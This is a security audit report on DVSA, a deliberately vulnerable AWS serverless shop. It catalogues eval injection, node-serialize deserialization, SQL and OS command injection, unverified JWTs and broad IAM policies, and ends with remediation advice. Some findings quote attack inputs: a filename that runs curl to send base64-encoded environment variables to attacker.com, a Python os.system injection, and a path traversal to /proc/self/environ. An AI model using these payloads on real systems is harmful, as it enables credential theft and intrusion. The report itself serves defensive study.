# DVSA (Damn Vulnerable Serverless Application) - Security Vulnerability Report

## Executive Summary

This security review of the DVSA (Damn Vulnerable Serverless Application) serverless e-commerce application reveals **numerous critical and high-severity security vulnerabilities** across the backend Lambda functions, infrastructure configuration (AWS SAM template), and client-side code. The application is built on AWS serverless services including Lambda, API Gateway, DynamoDB, S3, SQS, Cognito, and SES. The vulnerabilities span injection attacks, broken authentication/authorization, insecure deserialization, overly permissive IAM policies, and more.

---

## Critical Vulnerabilities

### 1. Remote Code Execution (RCE) via `eval()` — `admin_shell.js`

**File:** `backend/functions/admin/admin_shell.js`  
**Severity:** CRITICAL  
**CWE:** CWE-94 (Improper Control of Generation of Code / Code Injection)

The admin shell function accepts a `cmd` parameter from the request body and passes it directly to JavaScript's `eval()` function:

```javascript
const cmd = body.cmd;
if (cmd) {
    try {
        eval(cmd);  // ARBITRARY CODE EXECUTION
        res = "ok";
    } catch (error) {
        console.error(error);
    }
}
```

**Impact:** An attacker with admin access (or who can bypass the admin check) can execute arbitrary JavaScript code on the Lambda runtime, potentially accessing environment variables (AWS credentials), making AWS API calls, reading the filesystem, or pivoting to other services.

**Additional Issue (Path Traversal):** The same function also reads files using user-controlled input without proper sanitization:

```javascript
if (body.file) {
    const filename = "/tmp/"+ body.file;  // VULNERABLE - path traversal
    res = fs.readFileSync(filename, 'utf8');
}
```

An attacker can use `../` sequences (e.g., `../../proc/self/environ`) to read arbitrary files from the Lambda container, including environment variables containing AWS credentials.

---

### 2. Remote Code Execution via Insecure Deserialization — `order-manager.js`

**File:** `backend/functions/order-manager/order-manager.js`  
**Severity:** CRITICAL  
**CWE:** CWE-502 (Deserialization of Untrusted Data)

The order manager function uses the `node-serialize` library to deserialize untrusted user input from both the request body and headers:

```javascript
const serialize = require('node-serialize');
// ...
var req = serialize.unserialize(event.body);
var headers = serialize.unserialize(event.headers);
```

The `node-serialize` library is known to be vulnerable to remote code execution through specially crafted serialized objects. An attacker can craft a malicious serialized payload with an Immediately Invoked Function Expression (IIFE) that executes arbitrary code during deserialization.

**Impact:** Complete remote code execution on the Lambda runtime before any authentication or authorization checks are performed. This is the entry point for all order-related operations and is directly exposed via API Gateway.

---

### 3. Server-Side Code Injection via `eval()` — `admin_get_orders.py`

**File:** `backend/functions/admin/admin_get_orders.py`  
**Severity:** CRITICAL  
**CWE:** CWE-94 (Code Injection)

The function constructs a Python filter expression string from user input and then evaluates it using `eval()`:

```python
fe = "Attr('paymentTS').between(dateFrom, dateTo)"
orderId = "" if 'orderId' not in event else " & Attr('orderId').eq(event['orderId'])"
userId = "" if 'userId' not in event else " & Attr('userId').eq(event['userId'])"
status = "" if 'status' not in event else " & Attr('orderStatus').eq(event['status'])"
fe = fe + orderId + userId + status

response = table.scan(
    FilterExpression=eval(fe),  # CODE INJECTION
)
```

**Impact:** An attacker can inject arbitrary Python code through the `orderId`, `userId`, or `status` parameters. For example, injecting `__import__('os').system('...')` would allow arbitrary command execution.

---

### 4. OS Command Injection — `feedback_uploads.py`

**File:** `backend/functions/processing/feedback_uploads.py`  
**Severity:** CRITICAL  
**CWE:** CWE-78 (OS Command Injection)

The function passes an S3 object key (filename) directly to `os.system()` without any sanitization:

```python
filename = parse.unquote_plus(event["Records"][0]["s3"]["object"]["key"])
if not is_safe(filename):
    return {"status": "error", "message": "invalid filename"}
os.system("touch /tmp/{} /tmp/{}.txt".format(filename, filename))
```

**Critically, the `is_safe()` function is completely disabled** — it always returns `True`:

```python
def is_safe(s):
    # if s.find(";") > -1 or s.find("'") > -1 or s.find("|") > -1:
    #    return False
    return True
```

**Impact:** An attacker can upload a file to the S3 feedback bucket with a specially crafted filename (e.g., `; curl attacker.com/exfil?$(env | base64)`) to execute arbitrary operating system commands on the Lambda container.

---

### 5. SQL Injection — `get_cart_total.py`

**File:** `backend/functions/processing/get_cart_total.py`  
**Severity:** CRITICAL  
**CWE:** CWE-89 (SQL Injection)

The function constructs SQL queries using string concatenation with user-supplied `itemId` values:

```python
item_id = obj["itemId"]
res = cur.execute("SELECT itemId, price, quantity FROM inventory WHERE itemId = " + item_id + ";")
```

**Impact:** An attacker can inject arbitrary SQL into the SQLite query through the `itemId` field. This could allow data exfiltration from the inventory database, modification of item prices (setting price to 0 or negative), or other SQLite-specific attacks.

---

### 6. SQL Injection — `create_receipt.py`

**File:** `backend/functions/processing/create_receipt.py`  
**Severity:** CRITICAL  
**CWE:** CWE-89 (SQL Injection)

Same pattern as `get_cart_total.py` — string concatenation for SQL query construction:

```python
item_id = item["itemId"]
res = cur.execute("SELECT itemId, name, price FROM inventory WHERE itemId = " + item_id + ";")
```

**Impact:** Identical to the SQL injection in `get_cart_total.py`. An attacker who has placed an order with a malicious `itemId` value can exploit this when the receipt is generated.

---

### 7. Insecure Deserialization via `jsonpickle` — `admin_update_orders.py`

**File:** `backend/functions/admin/admin_update_orders.py`  
**Severity:** HIGH  
**CWE:** CWE-502 (Deserialization of Untrusted Data)

The function uses `jsonpickle.decode()` to deserialize DynamoDB data:

```python
import jsonpickle
# ...
def getItem(orderId, user):
    key = {"orderId": orderId}
    response = table.get_item(Key=key)
    unpickled = jsonpickle.decode(json.dumps(response["Item"], cls=DecimalEncoder))
    return {"status": "ok", "msg": unpickled}
```

**Impact:** If an attacker can control or inject data into the DynamoDB orders table (which is possible through other vulnerabilities), they can craft malicious serialized objects that execute arbitrary code when deserialized by `jsonpickle.decode()`.

---

### 8. OS Command Injection — `send_receipt_email.py`

**File:** `backend/functions/processing/send_receipt_email.py`  
**Severity:** HIGH  
**CWE:** CWE-78 (OS Command Injection)

The function uses `os.system()` to write date information to a file:

```python
download_path = f'/tmp/{str(uuid.uuid4())}.txt'
date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M')
os.system(f'echo -e "\t----------------------\n\t\tDate: {date}" >> ' + download_path)
```

While `date` is derived from `datetime.now()` (not directly user-controlled), the use of `os.system()` is an insecure coding pattern. If there were any way to influence the date formatting or the download path, this would be directly exploitable. The use of `os.system()` when Python alternatives exist (e.g., `open()` and `write()`) is a security anti-pattern.

---

## High-Severity Vulnerabilities

### 9. Broken Authentication — JWT Token Parsed Without Verification

**File:** `backend/functions/order-manager/order-manager.js`  
**Severity:** HIGH  
**CWE:** CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification of Data Authenticity)

The order manager extracts user identity from the JWT token without verifying its signature:

```javascript
var auth_header = headers.Authorization || headers.authorization;
var token_sections = auth_header.split('.');
var auth_data = jose.util.base64url.decode(token_sections[1]);
var token = JSON.parse(auth_data);
var user = token.username;
```

Similarly in `admin_update_orders.py`:

```python
token_sections = auth_header.split('.')
auth_data = base64.b64decode(token_sections[1])
token = json.loads(auth_data)
user = token["username"]
```

**Impact:** An attacker can forge a JWT token with any username to impersonate other users, access their orders, modify their profiles, and perform any user-level action. No signature verification means the token's integrity is never checked.

---

### 10. Privilege Escalation via User-Controllable Admin Attribute

**File:** `backend/functions/user/user_create.py`  
**Severity:** HIGH  
**CWE:** CWE-269 (Improper Privilege Management)

During user creation, the admin flag is set based on a user-controllable Cognito attribute:

```python
if "Admin" in event["request"]["userAttributes"] and event["request"]["userAttributes"]["Admin"] == True:
    isAdmin = True
```

The Cognito User Pool schema defines `is_admin` as a mutable custom attribute:

```yaml
- AttributeDataType: String
  Name: is_admin
  DeveloperOnlyAttribute: false
  Mutable: true
```

**Impact:** A user may be able to set or modify their `is_admin` / `Admin` attribute during registration or profile update, granting themselves administrator privileges.

---

### 11. Overly Permissive IAM Policies

**File:** `template.yml`  
**Severity:** HIGH  
**CWE:** CWE-250 (Execution with Unnecessary Privileges), CWE-732 (Incorrect Permission Assignment)

Multiple Lambda functions are assigned overly broad IAM policies that violate the principle of least privilege:

- **`FeedbackUploadFunction`**: Granted `AWSLambda_FullAccess`, `AmazonSESFullAccess`, and `AmazonS3FullAccess` — provides unrestricted access to all Lambda functions, SES, and S3 buckets across the account.
- **`OrderManagerFunction`**: Granted `AmazonCognitoPowerUser`, `CloudWatchLogsFullAccess`, and `AWSLambdaRole` — allows managing Cognito users and reading all CloudWatch logs.
- **`SendReceiptFunction`**: Granted `AmazonSESFullAccess` and `S3CrudPolicy` with `BucketName: '*'` (all buckets).
- **`CreateReceiptFunction`**: Granted `DynamoDBCrudPolicy` with `TableName: '*'` (all tables).
- **`AdminUpdateOrdersFunction`**: Granted `AmazonCognitoPowerUser` and `DynamoDBCrudPolicy` with `TableName: '*'`.
- **`AdminShellFunction`**: Granted `AmazonDynamoDBFullAccess` and `AWSLambda_FullAccess`.
- **`UserCreateFunction`**: Granted `AmazonSESFullAccess`, `AWSLambda_FullAccess`, `DynamoDBCrudPolicy` with `TableName: '*'`.

**Impact:** If any of these Lambda functions are compromised (which is highly likely given the other vulnerabilities), the attacker gains broad access to the AWS account's resources, including all S3 buckets, DynamoDB tables, Lambda functions, Cognito user pools, and email services.

---

### 12. CORS Misconfiguration — Wildcard Allow Origin

**File:** `template.yml`  
**Severity:** HIGH  
**CWE:** CWE-942 (Permissive Cross-domain Policy)

The API Gateway is configured with fully permissive CORS headers:

```yaml
Globals:
  Api:
    Cors:
      AllowMethods: "'*'"
      AllowHeaders: "'*'"
      AllowOrigin: "'*'"
```

**Impact:** Any website can make cross-origin requests to the API endpoints, enabling cross-site request forgery (CSRF) attacks if the API relies on cookie-based authentication, and allowing malicious sites to interact with the API on behalf of authenticated users.

---

### 13. Weak Cognito Password Policy

**File:** `template.yml`  
**Severity:** HIGH  
**CWE:** CWE-521 (Weak Password Requirements)

The Cognito User Pool has an extremely weak password policy:

```yaml
Policies:
  PasswordPolicy:
    RequireLowercase: false
    RequireSymbols: false
    RequireNumbers: false
    MinimumLength: 6
    RequireUppercase: false
```

**Impact:** Users can create accounts with simple 6-character passwords (e.g., "aaaaaa"), making them highly susceptible to brute-force and credential stuffing attacks. The default admin password is also set to `changeme!`.

---

## Medium-Severity Vulnerabilities

### 14. Broken Access Control — Client-Side Admin Check

**File:** `client/src/components/AdminPage.js`  
**Severity:** MEDIUM  
**CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security)

The admin page only checks admin status on the client side:

```javascript
componentDidMount() {
    if (!this.props.isAdmin) {
        alert("You are not an admin!");
        this.props.history.push("/");
    }
}
```

While some backend admin functions verify admin status via DynamoDB lookups, the `admin_shell.js` admin check relies on the `userId` from the request body (which can be forged), and the `order-manager.js` passes the `isAdmin` flag from the unverified JWT token.

**Impact:** Client-side authorization can be easily bypassed, and the backend admin verification is inconsistent and unreliable.

---

### 15. Missing `break` Statement in Switch Case — `order-manager.js`

**File:** `backend/functions/order-manager/order-manager.js`  
**Severity:** MEDIUM  
**CWE:** CWE-484 (Omitted Break Statement in Switch)

The `feedback` case in the switch statement is missing a `break` statement, causing it to fall through to the `admin-orders` case:

```javascript
case "feedback":
    const response = {
        statusCode: 200,
        headers: { "Access-Control-Allow-Origin" : "*" },
        body: JSON.stringify({"status": "ok", "message": `Thank you ${req["data"]["name"]}.`})
    };
    callback(null, response);
    // MISSING BREAK - falls through to admin-orders

case "admin-orders":
    if (isAdmin == "true") {
        // ...
    }
```

**Impact:** When a user submits feedback, execution falls through to admin-related functionality, potentially invoking admin functions unintentionally.

---

### 16. Sensitive Data Logging

**File:** Multiple backend files  
**Severity:** MEDIUM  
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

Multiple functions log sensitive data including full event payloads containing user data, payment information, and order details:

```python
# order_billing.py
print(json.dumps(event))  # Logs billing/payment data

# feedback_uploads.py
print(json.dumps(event))  # Logs user data

# get_cart_total.py
print(json.dumps(event))  # Logs cart data
```

**Impact:** Sensitive user data, payment details, and PII are written to CloudWatch Logs, which may be accessible to unauthorized personnel or retained longer than necessary.

---

### 17. Email Address Information Disclosure

**File:** `backend/functions/user/user_inbox.py`  
**Severity:** MEDIUM  
**CWE:** CWE-200 (Exposure of Sensitive Information)

The inbox function constructs predictable email addresses using the AWS account ID and user ID:

```python
secmail = "dvsa.{}.{}@1secmail.com".format(account_id, ''.join(userId.split('-')))
```

Error messages also expose the full email address:

```python
res = {"status": "err", "msg": "could not retrieve emails for: " + secmail}
```

**Impact:** The email format exposes the AWS account ID and user IDs, and uses a public temporary email service (1secmail.com), meaning anyone who can guess the format can read user emails.

---

### 18. Unrestricted File Upload — Feedback Uploads

**File:** `backend/functions/processing/feedback_uploads.py`  
**Severity:** MEDIUM  
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

The feedback upload function generates a pre-signed S3 URL for any filename without validating the file type, size, or content:

```python
response = s3.generate_presigned_post(os.environ["FEEDBACK_BUCKET"], 
                                    uuidv4 + "_" + event["file"],
                                    ExpiresIn=120)
```

No conditions are set on content type, file size, or allowed file extensions.

**Impact:** Attackers can upload any file type (executables, scripts, HTML files) to the S3 bucket, which combined with the command injection vulnerability makes this a complete attack chain.

---

### 19. Insecure Direct Object Reference (IDOR) — Order Operations

**File:** `backend/functions/order/get_order.py`  
**Severity:** MEDIUM  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

When the `isAdmin` flag is set (which comes from the unverified JWT token), the function queries orders without verifying the userId:

```python
if is_admin:
    response = table.query(
        KeyConditionExpression=Key('orderId').eq(orderId)
    ).get("Items", [None])
```

Since `isAdmin` comes from the unverified JWT token in order-manager.js, any user can set `isAdmin` to `true` and access any order by its orderId.

**Impact:** Any user can access, view, and potentially modify any other user's orders.

---

### 20. Hardcoded Default Credentials

**File:** `template.yml`  
**Severity:** MEDIUM  
**CWE:** CWE-798 (Use of Hard-coded Credentials)

The template includes a hardcoded default admin password and email:

```yaml
Parameters:
  AdminEmail:
    Description: "Email for admin user. Default password: 'changeme!' ..."
    Default: dvsa.admin@1secmail.com
```

**Impact:** If the default password is not changed during deployment, the admin account is accessible with known credentials.

---

## Low-Severity / Informational Findings

### 21. Exception Handling Suppresses Errors

**File:** Multiple backend files  
**Severity:** LOW  
**CWE:** CWE-390 (Detection of Error Condition Without Action)

Multiple functions use broad exception handling that silently catches all errors:

```python
# order_billing.py
except:
    res = {"status": "err", "msg": "unknown error"}

# admin_tweet.py
except:
    pass
```

**Impact:** Errors are silently swallowed, making debugging difficult and potentially hiding security-relevant failures.

---

### 22. Deprecated/Vulnerable Dependencies

**File:** `backend/functions/order-manager/package.json`  
**Severity:** LOW  
**CWE:** CWE-1104 (Use of Unmaintained Third Party Components)

The `node-serialize` package is inherently dangerous and has known RCE vulnerabilities (CVE-2017-5941). Its use in any capacity is a security risk.

---

### 23. API Gateway Without Authorization

**File:** `template.yml`  
**Severity:** MEDIUM  
**CWE:** CWE-306 (Missing Authentication for Critical Function)

Several API Gateway endpoints are configured without any authorization:

- `/total` (POST) — No authorization
- `/payment` (POST) — No authorization  
- `/admin` (POST) — No authorization at the API Gateway level

**Impact:** These endpoints are publicly accessible without any authentication, allowing unauthenticated users to invoke payment processing and admin functions.

---

### 24. S3 Bucket Configuration Issues

**File:** `template.yml`  
**Severity:** MEDIUM  
**CWE:** CWE-284 (Improper Access Control)

The S3 website bucket is configured as a public website:

```yaml
S3WebsiteBucket:
  Type: AWS::S3::Bucket
  Properties:
    WebsiteConfiguration:
      IndexDocument: index.html
```

With a permissive bucket policy allowing public read access. The feedback and receipts buckets may also be accessible depending on the IAM policies applied.

---

## Summary Table

| # | Vulnerability | Severity | File | CWE |
|---|---|---|---|---|
| 1 | RCE via eval() | CRITICAL | admin_shell.js | CWE-94 |
| 2 | RCE via node-serialize | CRITICAL | order-manager.js | CWE-502 |
| 3 | OS Command Injection | CRITICAL | feedback_uploads.py | CWE-78 |
| 4 | Code Injection via eval() | CRITICAL | admin_get_orders.py | CWE-94 |
| 5 | SQL Injection | CRITICAL | get_cart_total.py | CWE-89 |
| 6 | SQL Injection | CRITICAL | create_receipt.py | CWE-89 |
| 7 | Insecure Deserialization (jsonpickle) | HIGH | admin_update_orders.py | CWE-502 |
| 8 | OS Command Injection | HIGH | send_receipt_email.py | CWE-78 |
| 9 | Path Traversal | CRITICAL | admin_shell.js | CWE-22 |
| 10 | Broken JWT Authentication | HIGH | order-manager.js | CWE-287 |
| 11 | Privilege Escalation | HIGH | user_create.py | CWE-269 |
| 12 | Overly Permissive IAM | HIGH | template.yml | CWE-250 |
| 13 | CORS Misconfiguration | HIGH | template.yml | CWE-942 |
| 14 | Weak Password Policy | HIGH | template.yml | CWE-521 |
| 15 | Client-Side Auth | MEDIUM | AdminPage.js | CWE-602 |
| 16 | Missing Break in Switch | MEDIUM | order-manager.js | CWE-484 |
| 17 | Sensitive Data Logging | MEDIUM | Multiple | CWE-532 |
| 18 | Email Info Disclosure | MEDIUM | user_inbox.py | CWE-200 |
| 19 | Unrestricted File Upload | MEDIUM | feedback_uploads.py | CWE-434 |
| 20 | IDOR | MEDIUM | get_order.py | CWE-639 |
| 21 | Hardcoded Credentials | MEDIUM | template.yml | CWE-798 |
| 22 | Missing API Auth | MEDIUM | template.yml | CWE-306 |
| 23 | Disabled Input Validation | CRITICAL | feedback_uploads.py | CWE-20 |
| 24 | Deprecated Dependencies | LOW | package.json | CWE-1104 |

---

## Recommendations

1. **Eliminate all uses of `eval()`** in both Python and JavaScript code. Use parameterized queries and safe alternatives.
2. **Remove `node-serialize`** entirely and use `JSON.parse()` for deserialization.
3. **Remove `jsonpickle`** and use standard `json` module for data handling.
4. **Use parameterized SQL queries** instead of string concatenation.
5. **Implement proper input validation and sanitization** — re-enable and strengthen the `is_safe()` function.
6. **Never use `os.system()`** — use Python's built-in file I/O operations instead.
7. **Verify JWT signatures server-side** using proper JWT verification libraries.
8. **Apply least-privilege IAM policies** — restrict each function to only the specific resources and actions it needs.
9. **Restrict CORS** to specific allowed origins.
10. **Enforce strong password policies** in Cognito.
11. **Implement server-side authorization** for all admin functions.
12. **Remove hardcoded credentials** and use secrets management.
13. **Restrict file uploads** by type, size, and content validation.
14. **Remove sensitive data from logs**.
15. **Add API Gateway authorizers** (Cognito or Lambda) to all endpoints.
